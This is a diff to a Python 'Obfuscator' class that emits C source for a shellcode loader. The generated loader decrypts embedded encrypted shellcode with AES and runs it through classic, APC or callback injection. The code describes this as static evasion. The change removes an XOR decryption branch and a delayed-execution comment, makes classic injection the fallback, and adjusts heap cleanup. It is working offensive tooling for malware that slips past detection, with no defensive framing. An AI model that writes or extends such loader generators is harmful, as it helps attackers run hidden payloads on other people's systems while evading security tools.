@@ -242,9 +242,6 @@ class Obfuscator:
         return 0;
     }
 
-    // Delayed Execution PoC (silent sleep)
-    // delayed_execution(5); 
-
     // --- Layer 1: Static Evasion (Decryption) ---
 """
         enc_name = l1.get("name", "aes_encrypt")
@@ -256,28 +253,18 @@ class Obfuscator:
     DWORD dec_sc_len = 0;
     if (aes_decrypt(encrypted_shellcode, shellcode_enc_len, aes_key, aes_iv, &dec_sc, &dec_sc_len)) {
 """
-        elif "xor" in enc_name:
-             main_logic += """
-    unsigned char *dec_sc = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, shellcode_len);
-    memcpy(dec_sc, encrypted_shellcode, shellcode_len);
-    xor_decrypt(dec_sc, shellcode_len, xor_key, xor_key_len);
-    DWORD dec_sc_len = shellcode_len;
-    {
-"""
         else:
-             main_logic += "    /* No decryption logic generated for this scheme */\n    {\n"
+             main_logic += "    { unsigned char *dec_sc = encrypted_shellcode; DWORD dec_sc_len = shellcode_enc_len; \n"
 
-        # Add injection call
-        if "classic" in inj_name:
-            main_logic += "        classic_inject(GetCurrentProcessId(), dec_sc, dec_sc_len);\n"
-        elif "apc" in inj_name:
-            main_logic += "        apc_inject(GetCurrentProcessId(), dec_sc, dec_sc_len);\n"
-        elif "callback" in inj_name:
-            main_logic += "        callback_execute(dec_sc, dec_sc_len);\n"
+        # Add injection/execution call based on method
+        if "callback" in injection_method:
+             main_logic += "        callback_execute(dec_sc, dec_sc_len);\n"
+        elif "apc" in injection_method:
+             main_logic += "        apc_inject(GetCurrentProcessId(), dec_sc, dec_sc_len);\n"
         else:
-            main_logic += "        /* Unknown injection technique call */\n"
+             main_logic += "        classic_inject(GetCurrentProcessId(), dec_sc, dec_sc_len);\n"
 
-        main_logic += "        if (dec_sc) HeapFree(GetProcessHeap(), 0, dec_sc);\n    }\n"
+        main_logic += "        if (dec_sc && dec_sc != encrypted_shellcode) HeapFree(GetProcessHeap(), 0, dec_sc);\n    }\n"
 
         return {
             "encryption_code": l1.get("code", ""),
